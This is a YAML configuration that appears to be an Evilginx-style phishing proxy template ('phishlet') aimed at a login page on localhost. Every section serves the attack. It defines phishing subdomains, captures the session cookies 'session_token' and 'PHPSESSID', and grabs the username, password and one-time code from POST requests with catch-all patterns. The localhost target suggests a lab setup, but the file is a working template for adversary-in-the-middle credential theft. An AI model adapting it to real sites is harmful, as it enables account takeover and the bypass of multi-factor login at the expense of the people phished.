min_ver: '3.0.0'
author: 'vndck'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'localhost', session: true, is_landing: true}
  - {phish_sub: '', orig_sub: '', domain: 'localhost', session: true, is_landing: false}
  
sub_filters:
  - {triggers_on: 'login.localhost', orig_sub: 'login', domain: 'localhost', search: 'https://{hostname}/index.php', replace: 'https://{hostname}/index.php', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}

auth_tokens:
  - domain: 'login.localhost'
    keys: ['session_token', 'PHPSESSID']

credentials:
  otp:
    key: 'otp'  
    search: '(.*)'
    type: 'post'
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '/admin.php'

login:
  domain: 'login.localhost'
  path: '/index.php'
